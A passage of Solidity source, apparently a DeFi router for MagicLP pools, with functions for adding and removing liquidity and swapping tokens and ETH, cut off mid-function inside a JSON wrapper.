IMagicLP(lp)._QUOTE_TOKEN_().safeTransferFrom(msg.sender, lp, quoteAdjustedInAmount);\n\n        shares = _addLiquidity(lp, to, minimumShares);\n    }\n\n    function addLiquidityUnsafe(\n        address lp,\n        address to,\n        uint256 baseInAmount,\n        uint256 quoteInAmount,\n        uint256 minimumShares,\n        uint256 deadline\n    ) external ensureDeadline(deadline) returns (uint256 shares) {\n        IMagicLP(lp)._BASE_TOKEN_().safeTransferFrom(msg.sender, lp, baseInAmount);\n        IMagicLP(lp)._QUOTE_TOKEN_().safeTransferFrom(msg.sender, lp, quoteInAmount);\n\n        return _addLiquidity(lp, to, minimumShares);\n    }\n\n    function addLiquidityETH(\n        address lp,\n        address to,\n        address payable refundTo,\n        uint256 tokenInAmount,\n        uint256 minimumShares,\n        uint256 deadline\n    ) external payable ensureDeadline(deadline) returns (uint256 baseAdjustedInAmount, uint256 quoteAdjustedInAmount, uint256 shares) {\n        uint256 wethAdjustedAmount;\n        uint256 tokenAdjustedAmount;\n        address token = IMagicLP(lp)._BASE_TOKEN_();\n        if (token == address(weth)) {\n            token = IMagicLP(lp)._QUOTE_TOKEN_();\n            (baseAdjustedInAmount, quoteAdjustedInAmount) = _adjustAddLiquidity(lp, msg.value, tokenInAmount);\n            wethAdjustedAmount = baseAdjustedInAmount;\n            tokenAdjustedAmount = quoteAdjustedInAmount;\n        } else if (IMagicLP(lp)._QUOTE_TOKEN_() == address(weth)) {\n            (baseAdjustedInAmount, quoteAdjustedInAmount) = _adjustAddLiquidity(lp, tokenInAmount, msg.value);\n            wethAdjustedAmount = quoteAdjustedInAmount;\n            tokenAdjustedAmount = baseAdjustedInAmount;\n        } else {\n            revert ErrNotETHLP();\n        }\n\n        weth.deposit{value: wethAdjustedAmount}();\n        address(weth).safeTransfer(lp, wethAdjustedAmount);\n\n        // Refund unused ETH\n        if (msg.value > wethAdjustedAmount) {\n            refundTo.safeTransferETH(msg.value - wethAdjustedAmount);\n        }\n\n        token.safeTransferFrom(msg.sender, lp, tokenAdjustedAmount);\n\n        shares = _addLiquidity(lp, to, minimumShares);\n    }\n\n    function addLiquidityETHUnsafe(\n        address lp,\n        address to,\n        uint256 tokenInAmount,\n        uint256 minimumShares,\n        uint256 deadline\n    ) external payable ensureDeadline(deadline) returns (uint256 shares) {\n        address token = IMagicLP(lp)._BASE_TOKEN_();\n        if (token == address(weth)) {\n            token = IMagicLP(lp)._QUOTE_TOKEN_();\n        } else if (IMagicLP(lp)._QUOTE_TOKEN_() != address(weth)) {\n            revert ErrNotETHLP();\n        }\n\n        weth.deposit{value: msg.value}();\n        address(weth).safeTransfer(lp, msg.value);\n\n        token.safeTransferFrom(msg.sender, lp, tokenInAmount);\n\n        return _addLiquidity(lp, to, minimumShares);\n    }\n\n    function previewRemoveLiquidity(address lp, uint256 sharesIn) external view returns (uint256 baseAmountOut, uint256 quoteAmountOut) {\n        uint256 baseBalance = IMagicLP(lp)._BASE_TOKEN_().balanceOf(address(lp));\n        uint256 quoteBalance = IMagicLP(lp)._QUOTE_TOKEN_().balanceOf(address(lp));\n\n        uint256 totalShares = IERC20(lp).totalSupply();\n\n        baseAmountOut = (baseBalance * sharesIn) / totalShares;\n        quoteAmountOut = (quoteBalance * sharesIn) / totalShares;\n    }\n\n    function removeLiquidity(\n        address lp,\n        address to,\n        uint256 sharesIn,\n        uint256 minimumBaseAmount,\n        uint256 minimumQuoteAmount,\n        uint256 deadline\n    ) external returns (uint256 baseAmountOut, uint256 quoteAmountOut) {\n        lp.safeTransferFrom(msg.sender, address(this), sharesIn);\n\n        return IMagicLP(lp).sellShares(sharesIn, to, minimumBaseAmount, minimumQuoteAmount, \"\", deadline);\n    }\n\n    function removeLiquidityETH(\n        address lp,\n        address to,\n        uint256 sharesIn,\n        uint256 minimumETHAmount,\n        uint256 minimumTokenAmount,\n        uint256 deadline\n    ) external returns (uint256 ethAmountOut, uint256 tokenAmountOut) {\n        lp.safeTransferFrom(msg.sender, address(this), sharesIn);\n\n        address token = IMagicLP(lp)._BASE_TOKEN_();\n        if (token == address(weth)) {\n            token = IMagicLP(lp)._QUOTE_TOKEN_();\n            (ethAmountOut, tokenAmountOut) = IMagicLP(lp).sellShares(\n                sharesIn,\n                address(this),\n                minimumETHAmount,\n                minimumTokenAmount,\n                \"\",\n                deadline\n            );\n        } else if (IMagicLP(lp)._QUOTE_TOKEN_() == address(weth)) {\n            (tokenAmountOut, ethAmountOut) = IMagicLP(lp).sellShares(\n                sharesIn,\n                address(this),\n                minimumTokenAmount,\n                minimumETHAmount,\n                \"\",\n                deadline\n            );\n        } else {\n            revert ErrNotETHLP();\n        }\n\n        weth.withdraw(ethAmountOut);\n        to.safeTransferETH(ethAmountOut);\n\n        token.safeTransfer(to, tokenAmountOut);\n    }\n\n    function swapTokensForTokens(\n        address to,\n        uint256 amountIn,\n        address[] calldata path,\n        uint256 directions,\n        uint256 minimumOut,\n        uint256 deadline\n    ) external ensureDeadline(deadline) returns (uint256 amountOut) {\n        _validatePath(path);\n\n        address firstLp = path[0];\n\n        // Transfer to the first LP\n        if (directions & 1 == 0) {\n            IMagicLP(firstLp)._BASE_TOKEN_().safeTransferFrom(msg.sender, address(firstLp), amountIn);\n        } else {\n            IMagicLP(firstLp)._QUOTE_TOKEN_().safeTransferFrom(msg.sender, address(firstLp), amountIn);\n        }\n\n        return _swap(to, path, directions, minimumOut);\n    }\n\n    function swapETHForTokens(\n        address to,\n        address[] calldata path,\n        uint256 directions,\n        uint256 minimumOut,\n        uint256 deadline\n    ) external payable ensureDeadline(deadline) returns (uint256 amountOut) {\n        _validatePath(path);\n\n        address firstLp = path[0];\n        address inToken;\n\n        if (directions & 1 == 0) {\n            inToken = IMagicLP(firstLp)._BASE_TOKEN_();\n        } else {\n            inToken = IMagicLP(firstLp)._QUOTE_TOKEN_();\n        }\n\n        // Transfer to the first LP\n        if (inToken != address(weth)) {\n            revert ErrInTokenNotETH();\n        }\n\n        weth.deposit{value: msg.value}();\n        inToken.safeTransfer(address(firstLp), msg.value);\n\n        return _swap(to, path, directions, minimumOut);\n    }\n\n    function swapTokensForETH(\n        address to,\n        uint256 amountIn,\n        address[] calldata path,\n        uint256 directions,\n        uint256 minimumOut,\n        uint256 deadline\n    ) external ensureDeadline(deadline) returns (uint256 amountOut) {\n        _validatePath(path);\n\n        uint256 lastLpIndex = path.length - 1;\n        address lastLp = path[lastLpIndex];\n        address outToken;\n\n        if ((directions >> lastLpIndex) & 1 == 0) {\n            outToken = IMagicLP(lastLp)._QUOTE_TOKEN_();\n        } else {\n            outToken = IMagicLP(lastLp)._BASE_TOKEN_();\n        }\n\n        if (outToken != address(weth)) {\n            revert ErrOutTokenNotETH();\n        }\n\n        address firstLp = path[0];\n\n        // Transfer to the first LP\n        if (directions & 1 == 0) {\n            IMagicLP(firstLp)._BASE_TOKEN_().safeTransferFrom(msg.sender, firstLp, amountIn);\n        } else {\n            IMagicLP(firstLp)._QUOTE_TOKEN_().safeTransferFrom(msg.sender, firstLp, amountIn);\n        }\n\n        amountOut = _swap(address(this), path, directions, minimumOut);\n        weth.withdraw(amountOut);\n\n        to.safeTransferETH(amountOut);\n    }\n\n    function sellBaseTokensForTokens(\n        address lp,\n        address to,\n        uint256 amountIn,\n        uint256 minimumOut,\n        uint256 deadline\n    ) external ensureDeadline(deadline) returns (uint256 amountOut) {\n        IMagicLP(lp)._BASE_TOKEN_().safeTransferFrom(msg.sender, lp, amountIn);\n        return _sellBase(lp, to, minimumOut);\n    }\n\n    function sellBaseETHForTokens(\n        address lp,\n        address to,\n        uint256 minimumOut,\n        uint256 deadline\n    ) external payable ensureDeadline(deadline) returns (uint256 amountOut) {\n        address baseToken = IMagicLP(lp)._BASE_TOKEN_();\n\n        if (baseToken != address(weth)) {\n            revert ErrInvalidBaseToken();\n        }\n\n        weth.deposit{value: msg.value}();\n        baseToken.safeTransfer(lp, msg.value);\n        return _sellBase(lp, to, minimumOut);\n    }\n\n    function sellBaseTokensForETH(\n        address lp,\n        address to,\n        uint256 amountIn,\n        uint256 minimumOut,\n        uint256 deadline\n    ) external ensureDeadline(deadline) returns (uint256 amountOut) {\n        if (IMagicLP(lp)._QUOTE_TOKEN_() != address(weth)) {\n            revert ErrInvalidQuoteToken();\n        }\n\n        IMagicLP(lp)._BASE_TOKEN_().safeTransferFrom(msg.sender, lp, amountIn);\n        amountOut = _sellBase(lp, address(this), minimumOut);\n        weth.withdraw(amountOut);\n        to.safeTransferETH(amountOut);\n    }\n\n    function sellQuoteTokensForTokens(\n        address lp,\n        address to,\n        uint256 amountIn,\n        uint256 minimumOut,\n        uint256 deadline\n    ) external ensureDeadline(deadline) returns (uint256 amountOut) {\n        IMagicLP(lp)._QUOTE_TOKEN_().safeTransferFrom(msg.sender, lp, amountIn);\n\n        return _sellQuote(lp, to, minimumOut);\n    }\n\n    function sellQuoteETHForTokens(\n        address lp,\n        address to,\n        uint256 minimumOut,\n        uint256 deadline\n    ) external payable ensureDeadline(deadline) returns (uint256 amountOut) {\n        address quoteToken = IMagicLP(lp)._QUOTE_TOKEN_();\n\n        if (quoteToken != address(weth)) {\n            revert ErrInvalidQuoteToken();\n        }\n\n        weth.deposit{value: msg.value}();\n        quoteToken.safeTransfer(lp, msg.value);\n        return _sellQuote(lp, to, minimumOut);\n    }\n\n    function sellQuoteTokensForETH(\n        address lp,\n        address to,\n        uint256 amountIn,\n        uint256 minimumOut,\n        uint256 deadline\n    ) external ensureDeadline(deadline) returns (uint256 amountOut) {\n        if (IMagicLP(lp)._BASE_TOKEN_() != address(weth)) {\n            revert ErrInvalidBaseToken();\n        }\n\n        IMagicLP(lp)._QUOTE_TOKEN_().safeTransferFrom(msg.sender, lp, amountIn);\n        amountOut = _sellQuote(lp, address(this), minimumOut);\n        weth.withdraw(amountOut);\n        to.safeTransferETH(amountOut);\n    }\n\n    //////////////////////////////////////////////////////////////////////////////////////\n    /// INTERNALS\n    //////////////////////////////////////////////////////////////////////////////////////\n\n    function _addLiquidity(address lp, address to, uint256 minimumShares) internal returns (uint256 shares) {\n        (shares, , ) = IMagicLP(lp).buyShares(to);\n\n        if (shares < minimumShares) {\n            revert ErrTooHighSlippage(shares);\n        }\n    }\n\n    /// Adapted from: https://github.com/DODOEX/contractV2/blob/main/contracts/SmartRoute/proxies/DODODspProxy.sol\n    /// Copyright 2020 DODO ZOO. Licensed under Apache-2.0.\n    function _adjustAddLiquidity(\n        address lp,\n        uint256 baseInAmount,\n        uint256 quoteInAmount\n    ) internal view returns (uint256 baseAdjustedInAmount, uint256 quoteAdjustedInAmount) {\n        (uint256 baseReserve, uint256 quoteReserve) = IMagicLP(lp).getReserves();\n        uint256 baseBalance = IMagicLP(lp)._BASE_TOKEN_().balanceOf(address(lp)) + baseInAmount;\n        uint256 quoteBalance = IMagicLP(lp)._QUOTE_TOKEN_().balanceOf(address(lp)) + quoteInAmount;\n\n        baseInAmount = baseBalance - baseReserve;\n        quoteInAmount = quoteBalance - quoteReserve;\n\n        if (IERC20(lp).totalSupply() == 0) {\n            uint256 i = IMagicLP(lp)._I_();\n            uint256 shares = quoteInAmount < DecimalMath.mulFloor(baseInAmount, i) ? DecimalMath.divFloor(quoteInAmount, i) : baseInAmount;\n            baseAdjustedInAmount = shares;\n            quoteAdjustedInAmount = DecimalMath.mulFloor(shares, i);\n        } else {\n            if (quoteReserve > 0 && baseReserve > 0) {\n                uint256 baseIncreaseRatio = DecimalMath.divFloor(baseInAmount, baseReserve);\n                uint256 quoteIncreaseRatio = DecimalMath.divFloor(quoteInAmount, quoteReserve);\n                if (baseIncreaseRatio <= quoteIncreaseRatio) {\n                    baseAdjustedInAmount = baseInAmount;\n                    quoteAdjustedInAmount = DecimalMath.mulFloor(quoteReserve, baseIncreaseRatio);\n                } else {\n                    quoteAdjustedInAmount = quot"
    }
  ]
}